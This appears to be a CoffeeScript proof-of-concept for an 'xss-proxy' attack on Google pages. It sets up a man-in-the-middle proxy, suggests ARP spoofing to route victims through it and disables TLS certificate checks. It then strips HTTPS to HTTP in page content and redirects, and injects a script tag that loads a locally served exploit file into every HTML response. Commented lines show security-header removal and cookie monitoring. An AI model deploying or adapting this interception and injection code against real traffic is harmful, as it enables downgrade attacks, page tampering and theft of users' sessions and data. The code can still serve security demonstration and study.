require 'fluentnode'
Proxy = require '../src/Proxy'
url   = require('url')

console.log '****** xss-proxy demo for Google'
console.log '****** configure your proxy to go to localhost:8890 (or set arp spoof)'

process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0

options =
  port: 8890

proxy = new Proxy(options)

proxy.create_Server()

proxy.send_Data

using proxy, ->
  @.modify_Data = (data)=>
    data = data.replace /https/g, 'http'          # SSLStrip

    data = data.replace /I'm Feeling Lucky/g, 'Hacked Search!' # Simple string replacement


    data = data.replace '</body>' , '<script src="/exploit" ></script>'+ '</body>' # dynamic script injection
    data


  @.use_SSL =  (requestInfo)=>
    #console.log requestInfo.host
    return true if ['www.google.co.uk', 'www.google.com'].contains requestInfo.host        # simple way to define which domains to proxy
    return false

  @.intercept_Request  = (url, requestInfo, proxy_Res_Headers)->
    if proxy_Res_Headers['content-type']?.indexOf('text/html') > -1
      console.log '>>>> Intercepting: ' + url
      return true
    return false

#  @.skip_Request = (url, requestInfo)->                           # use this to prevent urls from loading
#    if url.indexOf('....') > -1
#      console.log '[Skipping]: ' + url
#      return true
#    return false

  @on_Request = (req,res)=>
    parsedUrl = url.parse(req.url)
    if parsedUrl.path is '/exploit'                                # dynamically add this path
      res.writeHead 200, { 'content-type' : 'text/javascript'}
      res.write './poc/google-exploit.js'.file_Contents()         # which is a local file
      res.end()

  @.on_Proxy_Response_Headers = (headers)->
    if headers.location
      headers.location = headers.location.replace('https','http')  # handle location based http to https redirects
    #delete headers['cache-control']                               # removing security headers
    #delete headers['x-frame-options']
    headers['xss-proxy'] = 'was here'                              # leave signature

    #if headers['set-coookie']                                     # monitor cookies
    #  console.log headers['set-coookie']


process.on 'uncaughtException', (err)->
  console.log '[uncaughtException]: ' +  err

